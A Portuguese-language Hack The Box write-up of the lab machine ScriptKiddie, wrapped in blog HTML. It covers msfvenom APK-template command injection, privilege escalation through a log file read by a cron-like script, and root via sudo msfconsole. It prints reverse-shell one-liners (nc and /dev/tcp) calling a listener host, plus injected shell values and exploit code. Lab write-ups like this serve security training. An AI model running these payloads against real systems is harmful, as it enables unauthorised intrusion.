@@ -1,0 +1,1216 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.21.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Hackthebox write-up: ScriptKiddie | Davi Cruz</title>
+<meta name="description" content="Olá pessoal!  A máquina desta semana será ScriptKiddie, outra máquina Linux classificada como fácil do Hack The Box, criada por 0xdf.">
+
+
+  <meta name="author" content="Davi Cruz">
+  
+  <meta property="article:author" content="Davi Cruz">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Davi Cruz">
+<meta property="og:title" content="Hackthebox write-up: ScriptKiddie">
+<meta property="og:url" content="https://davicruz.com/writeup/2021/06/htb-scriptkiddie/">
+
+
+  <meta property="og:description" content="Olá pessoal!  A máquina desta semana será ScriptKiddie, outra máquina Linux classificada como fácil do Hack The Box, criada por 0xdf.">
+
+
+
+  <meta property="og:image" content="https://i.imgur.com/wHnMfBz.png">
+
+
+
+  <meta name="twitter:site" content="@zerahzurc">
+  <meta name="twitter:title" content="Hackthebox write-up: ScriptKiddie">
+  <meta name="twitter:description" content="Olá pessoal!  A máquina desta semana será ScriptKiddie, outra máquina Linux classificada como fácil do Hack The Box, criada por 0xdf.">
+  <meta name="twitter:domain" content="davicruz.com">
+  <meta name="twitter:url" content="https://davicruz.com/writeup/2021/06/htb-scriptkiddie/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="https://i.imgur.com/wHnMfBz.png">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2021-06-05T13:00:00-03:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://davicruz.com/writeup/2021/06/htb-scriptkiddie/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Davi Cruz",
+      "url": "https://davicruz.com/",
+      "sameAs": ["https://twitter.com/zerahzurc","https://www.linkedin.com/in/davicruz","https://github.com/davi-cruz"]
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="hrWV-PqvbpxEy2HdpVYFQNws2Sz_tROleVyF18s2kWA" />
+
+
+  <meta name="msvalidate.01" content="60B1FA6CDAF15D226AB529AF30386BD8">
+
+
+
+  <meta name="yandex-verification" content="08de8d8c0326420f">
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Davi Cruz Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+<!-- Favicon -->
+<link rel="shortcut icon" href="/assets/images/favicon.ico" />
+
+<!-- Multilang tags -->
+
+    
+<link rel="alternate" hreflang="pt-BR" href="/writeup/2021/06/htb-scriptkiddie/">
+    
+
+    
+<link rel="alternate" hreflang="en-US" href="/en-US/writeup/2021/06/htb-scriptkiddie/">
+    
+
+
+<!-- Cookie Consent - Osano -->
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.css" />
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          
+          <a class="site-logo" href="https://davicruz.com"><img src="/assets/images/logo.png" alt="Davi Cruz"></a>
+          
+          <a class="site-title" href="https://davicruz.com">
+            Davi Cruz
+            
+          </a>
+        
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+            <a href="/categorias/">Categorias</a>
+          </li>
+<li class="masthead__menu-item">
+            <a href="/tags/">Tags</a>
+          </li>
+<li class="masthead__menu-item">
+            <a href="/sobre/">Sobre</a>
+          </li>
+</ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Buscar</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/bio-photo.jpg" alt="Davi Cruz" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Davi Cruz</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Apenas mais um profissional de Cibersegurança</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Acompanhe no</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">São Paulo, BR</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fab fa-linkedin" aria-hidden="true"></i><span class="label">Linkedin</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+<li>
+  <strong></strong>
+  
+  <a class="link-en" href=""></a>
+  
+</li>
+
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hackthebox write-up: ScriptKiddie">
+    <meta itemprop="description" content="Olá pessoal!A máquina desta semana será ScriptKiddie, outra máquina Linux classificada como fácil do Hack The Box, criada por 0xdf.">
+    <meta itemprop="datePublished" content="2021-06-05T13:00:00-03:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hackthebox write-up: ScriptKiddie
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-06-05T13:00:00-03:00">June 5, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/06/htb-scriptkiddie/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p>Olá pessoal!</p>
+
+<p>A máquina desta semana será <strong>ScriptKiddie</strong>, outra máquina Linux classificada como fácil do <a href="https://www.hackthebox.eu">Hack The Box</a>, criada por <a href="https://app.hackthebox.eu/users/4935">0xdf</a>.<!--more--></p>
+
+<p class="notice--info"><img class="emoji" title=":information_source:" alt=":information_source:" src="https://github.githubassets.com/images/icons/emoji/unicode/2139.png" height="20" width="20"> <strong>Info</strong>: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas</p>
+
+<p><img src="https://i.imgur.com/W5wv9JE.png" alt="HTB ScriptKiddie" class="align-center"></p>
+
+<h2 id="enumeração">Enumeração</h2>
+
+<p>Como de costume, iniciado enumeração com um scan rápido do <code class="language-plaintext highlighter-rouge">nmap</code> para verificar os serviços publicados nesta máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.226                                                                   
+
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-02-24 14:05 <span class="nt">-03</span>
+Nmap scan report <span class="k">for </span>10.10.10.226
+Host is up <span class="o">(</span>0.077s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c <span class="o">(</span>RSA<span class="o">)</span>
+|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 <span class="o">(</span>ED25519<span class="o">)</span>
+5000/tcp open  http    Werkzeug httpd 0.16.1 <span class="o">(</span>Python 3.8.5<span class="o">)</span>
+|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
+|_http-title: k1d<span class="s1">'5 h4ck3r t00l5
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.94 seconds
+</span></code></pre></div></div>
+
+<h3 id="5000tcp---serviço-http">5000/TCP - Serviço HTTP</h3>
+
+<p>Ao acessar a página notado algumas ferramentas a serem utilizadas por algum script kiddie como executar um scan utilizando o <code class="language-plaintext highlighter-rouge">nmap</code>, criar um payload no <code class="language-plaintext highlighter-rouge">msfvenom</code> e buscar por exploits utilizando o <code class="language-plaintext highlighter-rouge">searchsploit</code>.</p>
+
+<p>Tentei diversas formas de injeção de código neste formulário, inclusive tentando algo automatizado como por exemplo a ferramenta <a href="https://github.com/commixproject/commix">commixproject/commix</a> que encontrei no Github, porém sem sucesso desta vez.</p>
+
+<p>Buscando por vulnerabilidades nas ferramentas utilizadas pela página (<code class="language-plaintext highlighter-rouge">nmap</code>, <code class="language-plaintext highlighter-rouge">msfvenom</code>, <code class="language-plaintext highlighter-rouge">searchsploit</code>), acabei encontrando uma relacionada ao <code class="language-plaintext highlighter-rouge">msfvenom</code>, conforme abaixo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit msfvenom
+<span class="nt">----------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                        |  Path
+<span class="nt">----------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Metasploit Framework 6.0.11 - msfvenom APK template <span class="nb">command </span>injection | multiple/local/49491.py
+<span class="nt">----------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div>
+
+<h2 id="aceso-inicial-e-user-flag">Aceso inicial e User flag</h2>
+
+<p>Alterado arquivo python com o payload desejado <code class="language-plaintext highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f</code>, encontrei alguns erros durante a execução do binário <code class="language-plaintext highlighter-rouge">keytool</code>, uma vez que este tenta assinar um arquivo APK com o payload no Common Name mas, uma vez que existia um caracter <code class="language-plaintext highlighter-rouge">+</code> no conteúdo codificado em base64 na primeira iteração, precisei modificá-lo para codificá-lo novamente, gerando um payload desta vez com sucesso a ser enviado na ferramenta e utilizado na exploração da vulnerabilidade no portal:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Change me
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f'</span>
+
+<span class="c1"># b64encode to avoid badchars (keytool is picky)
+</span><span class="n">payload_b64</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">()</span>
+<span class="k">if</span> <span class="s">'+'</span> <span class="ow">in</span> <span class="n">payload_b64</span><span class="p">:</span>
+    <span class="n">payload_b64</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">payload_b64</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">()</span>
+    <span class="n">decode</span> <span class="o">=</span> <span class="s">'| base64 -d | base64 -d'</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">decode</span> <span class="o">=</span> <span class="s">'| base64 -d'</span>
+
+<span class="n">dname</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"CN='|echo -n </span><span class="si">{</span><span class="n">payload_b64</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">decode</span><span class="si">}</span><span class="s"> | sh #"</span>
+</code></pre></div></div>
+
+<p>Abaixo podemos ver o output da criação do payload gerado, no caso o arquivo <code class="language-plaintext highlighter-rouge">evil.apk</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 49491.py                                                                                                               
+<span class="o">[</span>+] Manufacturing evil apkfile
+Payload: <span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.10.10 4443 <span class="o">&gt;</span>/tmp/f
+<span class="nt">-dname</span>: <span class="nv">CN</span><span class="o">=</span><span class="s1">'|echo -n Y20wZ0wzUnRjQzltTzIxclptbG1ieUF2ZEcxd0wyWTdZMkYwSUM5MGJYQXZabnd2WW1sdUwzTm9JQzFwSURJK0pqRjhibU1nTVRBdU1UQXVNVFF1TVRNMklEUTBORE1nUGk5MGJYQXZaZz09 | base64 -d | base64 -d | sh #
+
+  adding: empty (stored 0%)
+jar signed.
+
+Warning:
+The signer'</span>s certificate is self-signed.
+The SHA1 algorithm specified <span class="k">for </span>the <span class="nt">-digestalg</span> option is considered a security risk. This algorithm will be disabled <span class="k">in </span>a future update.
+The SHA1withRSA algorithm specified <span class="k">for </span>the <span class="nt">-sigalg</span> option is considered a security risk. This algorithm will be disabled <span class="k">in </span>a future update.
+POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.
+
+<span class="o">[</span>+] Done! apkfile is at /tmp/tmpt7qr4ner/evil.apk
+Do: msfvenom <span class="nt">-x</span> /tmp/tmpt7qr4ner/evil.apk <span class="nt">-p</span> android/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.0.0.1 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-o</span> /dev/null
+</code></pre></div></div>
+
+<p>Após gerado o arquivo APK contendo o payload, executado um request no portal com os dados sugeridos no final da execução do script anterior, apontando para o LHOST 127.0.0.1 e selecionando o tipo de payload android, que deverá ser traduzido para o payload <code class="language-plaintext highlighter-rouge">android/meterpreter/reverse_tcp</code>.</p>
+
+<p><img src="https://i.imgur.com/hWgxfFw.png" alt="Submiting the evil payload" class="align-center"></p>
+
+<p>Após clicar no botão <strong>Generate</strong>, um shell reverso foi retornado no listener inicializado previamente conforme especificado durante a criação do payload.</p>
+
+<p><img src="https://i.imgur.com/VAYnB2r.png" alt="reverse shell returned" class="align-center"></p>
+
+<p>Nesta mesma sessão obtida, com as credenciais em que o aplicativo se encontrava em execução, no caso o usuário <code class="language-plaintext highlighter-rouge">kid</code>, foi possível obter a flag de usuário.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kid@scriptkiddie:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>kid<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>kid<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>kid<span class="o">)</span>
+kid@scriptkiddie:~<span class="nv">$ </span><span class="nb">cat</span> /home/kid/user.txt
+&lt;redacted&gt;
+</code></pre></div></div>
+
+<h2 id="root-flag">Root flag</h2>
+
+<p>Depois de executar o <code class="language-plaintext highlighter-rouge">linenum.sh</code>, notado que existe outro usuário na máquina, <code class="language-plaintext highlighter-rouge">pwn</code>, e que tínhamos direito de leitura em seu perfil de diretório, o qual continha um arquivo chamado <code class="language-plaintext highlighter-rouge">scanloosers.sh</code> com o seguinte conteúdo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">log</span><span class="o">=</span>/home/kid/logs/hackers
+
+<span class="nb">cd</span> /home/pwn/
+<span class="nb">cat</span> <span class="nv">$log</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f3-</span> | <span class="nb">sort</span> <span class="nt">-u</span> | <span class="k">while </span><span class="nb">read </span>ip<span class="p">;</span> <span class="k">do
+    </span>sh <span class="nt">-c</span> <span class="s2">"nmap --top-ports 10 -oN recon/</span><span class="k">${</span><span class="nv">ip</span><span class="k">}</span><span class="s2">.nmap </span><span class="k">${</span><span class="nv">ip</span><span class="k">}</span><span class="s2"> 2&gt;&amp;1 &gt;/dev/null"</span> &amp;
+<span class="k">done
+
+if</span> <span class="o">[[</span> <span class="si">$(</span><span class="nb">wc</span> <span class="nt">-l</span> &lt; <span class="nv">$log</span><span class="si">)</span> <span class="nt">-gt</span> 0 <span class="o">]]</span><span class="p">;</span> <span class="k">then </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="o">&gt;</span> <span class="nv">$log</span><span class="p">;</span> <span class="k">fi</span>
+</code></pre></div></div>
+
+<p>Uma vez que este script lê o conteúdo de um arquivo localizado no perfil do usuário <code class="language-plaintext highlighter-rouge">kid</code> (<code class="language-plaintext highlighter-rouge">/home/kid/logs/hackers</code>), editado seu conteúdo com o valor abaixo, de modo que fosse possível injetar o código necessário para a obtenção de um novo shell reverso com a conta <code class="language-plaintext highlighter-rouge">pwn</code>, que aparentemente executaria este script de forma recorrente.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"  ;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/4242 0&gt;&amp;1' #"</span> <span class="o">&gt;</span> ~/logs/hackers
+</code></pre></div></div>
+
+<p>Após definir o novo listener e alterar o arquivo <code class="language-plaintext highlighter-rouge">hackers</code>, um novo shell reverso foi retornado, desta vez com a conta <code class="language-plaintext highlighter-rouge">pwn</code> <img class="emoji" title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"></p>
+
+<p>Enumerando novamente a máquina, desta vez a partir da conta deste novo usuário utilizando o <code class="language-plaintext highlighter-rouge">linpeas.sh</code>, notei que este user possuía direitos de execução do <code class="language-plaintext highlighter-rouge">msfconsole</code> de modo privilegiado.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+Matching Defaults entries for pwn on scriptkiddie:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pwn may run the following commands on scriptkiddie:
+    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+</code></pre></div></div>
+
+<p>Ao instanciar a console utilizando o <code class="language-plaintext highlighter-rouge">sudo</code>, pude executar comandos normalmente utilizando o privilégio de <code class="language-plaintext highlighter-rouge">root</code>, podendo assim ler o arquivo <code class="language-plaintext highlighter-rouge">/root/root.txt</code> e obter a flag final desta máquina</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn@scriptkiddie:~<span class="nv">$ </span><span class="nb">sudo</span> /opt/metasploit-framework-6.0.9/msfconsole <span class="nt">-q</span>
+msf6 <span class="o">&gt;</span> <span class="nb">id</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">exec</span>: <span class="nb">id
+
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+msf6 <span class="o">&gt;</span> <span class="nb">cat</span> /root/root.txt
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">exec</span>: <span class="nb">cat</span> /root/root.txt
+
+&lt;redacted&gt;
+msf6 <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>Espero que tenham gostado!</p>
+
+<p>Nos vemos no próximo post <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20"></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#htb-easy" class="page__taxonomy-item" rel="tag">htb-easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#htb-linux" class="page__taxonomy-item" rel="tag">htb-linux</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categorias: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categorias/#writeup" class="page__taxonomy-item" rel="tag">Writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Atualizado em:</strong> <time datetime="2021-06-05T13:00:00-03:00">June 5, 2021</time></p>
+
+
+      </footer>
+
+      <section id="sharelinks" class="page__share">
+  
+    <h4 class="page__share-title">Compartilhe</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?via=zerahzurc&amp;text=Hackthebox+write-up%3A+ScriptKiddie%20https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F06%2Fhtb-scriptkiddie%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F06%2Fhtb-scriptkiddie%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F06%2Fhtb-scriptkiddie%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+
+  <a href="whatsapp://send?text=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F06%2Fhtb-scriptkiddie%2F" data-action="share/whatsapp/share" class="btn btn--whatsapp" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Whatsapp"><i class="fab fa-fw fa-whatsapp" aria-hidden="true"></i><span> Whatsapp</span></a>
+
+  <a href="https://telegram.me/share/url?url=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F06%2Fhtb-scriptkiddie%2F&amp;text=Hackthebox+write-up%3A+ScriptKiddie" class="btn btn--telegram" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Telegram"><i class="fab fa-fw fa-telegram-plane" aria-hidden="true"></i><span> Telegram</span></a>
+
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+    
+      <a href="/writeup/2021/05/htb-delivery/" class="pagination--pager" title="Hackthebox write-up: Delivery
+">Anterior</a>
+    
+    
+    
+      
+        <a href="/writeup/2021/06/htb-tenet/" class="pagination--pager" title="Hackthebox write-up: Tenet
+">Próxima</a>
+        
+    
+  </nav>
+
+    </div>
+
+    
+      <div class="page__comments">
+  
+  
+      <h4 class="page__comments-title">Deixe um comentário</h4>
+      <section id="utterances-comments"></section>
+    
+</div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">Talvez você também goste</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/BmkB4rb.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/06/htb-tenet/" rel="permalink">Hackthebox write-up: Tenet
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-06-12T13:00:00-03:00">June 12, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          7 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/06/htb-scriptkiddie/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
